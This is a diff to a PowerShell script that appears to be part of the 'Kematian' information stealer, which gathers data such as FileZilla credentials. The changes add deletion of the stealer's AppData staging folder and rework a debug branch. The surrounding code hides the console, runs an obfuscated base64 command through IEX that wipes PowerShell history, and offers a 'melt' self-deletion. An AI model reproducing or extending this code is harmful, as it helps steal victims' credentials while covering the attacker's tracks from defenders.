@@ -1145,6 +1145,7 @@ FileZilla: $filezilla_info
     # cleanup
     Remove-Item "$zipFilePath" -Force
     Remove-Item "$folder_general" -Force -Recurse
+    Remove-Item "$ENV:APPDATA\Kematian" -Force -Recurse
 }
 
 if (CHECK_AND_PATCH -eq $true) {
@@ -1152,17 +1153,16 @@ if (CHECK_AND_PATCH -eq $true) {
         Hide-Console
     }
     KDMUTEX
-    if ($debug) {
-        Read-Host -Prompt "Press Enter to continue"
-        exit
-    }
-    else {
+    if (!($debug)) {
         [ProcessUtility]::MakeProcessKillable()
     }
     $script:SingleInstanceEvent.Close()
     $script:SingleInstanceEvent.Dispose()
     #removes history
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
+    if ($debug) {
+        Read-Host -Prompt "Press Enter to continue"
+    }
     if ($melt) { 
         try {
             Remove-Item $pscommandpath -force
